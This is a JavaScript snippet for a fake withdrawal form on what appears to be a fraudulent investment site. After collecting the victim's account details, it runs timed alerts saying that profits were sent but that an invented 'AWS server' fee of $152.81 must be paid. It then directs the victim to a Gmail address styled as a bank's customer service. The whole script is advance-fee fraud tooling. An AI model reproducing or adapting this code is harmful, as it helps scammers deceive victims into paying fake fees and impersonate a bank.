function submitWithdrawal() {
        // Fetch input values
        const accountName = document.getElementById("accountName").value;
        const accountNumber = document.getElementById("accountNumber").value;
        const profitBalance = parseFloat(document.getElementById("profitBalance").value.replace(/[^0-9.-]+/g,""));
        const withdrawalAmount = parseFloat(document.getElementById("withdrawalAmount").value);
        const bankName = document.getElementById("bankName").value;
        // Basic validation to check all fields are filled
        if (!withdrawalAmount || !bankName) {
            alert("Please enter the withdrawal amount and select a bank.");
            return;
        }
        // Check if withdrawal amount exceeds profit balance
        if (withdrawalAmount > profitBalance) {
            alert("Withdrawal amount exceeds your profit balance.");
            return;
        }
        // Confirm withdrawal details
        if (confirm(`Withdrawal Request:\nAccount Name: ${accountName}\nAccount Number: ${accountNumber}\nAmount: $${withdrawalAmount}\nBank: ${bankName}`)) {
            checkWithdrawalStatus();
        }
    } 
    function checkWithdrawalStatus() {
      let amount = 152.81;
      let pendingMessage = `We would like to inform you that your deposit was confirmed and your profit has been sent to your bank account, how ever,the transection is secured over the AWS cloud server, using a highly encrypted protocol to ensure the safety of your funds, the Aws server requires a fee of $${amount} to complete the transection.
      
      if you have any questions,
      please contact us at
      boacustomerservice648@gmail.com `;
      
        // Show the first alert
        setTimeout(() => {
          alert("checking withdrawal status...");
        }, 1000);
        
        // Set a timeout to close the alert after 1 seconds and show the next message
        setTimeout(() => {
            // Close the first alert by displaying the next message
            alert(`withdrawal pending...
            \n ${pendingMessage}`);
        }, 4000); // 4000 milliseconds = 3 seconds
    } 
   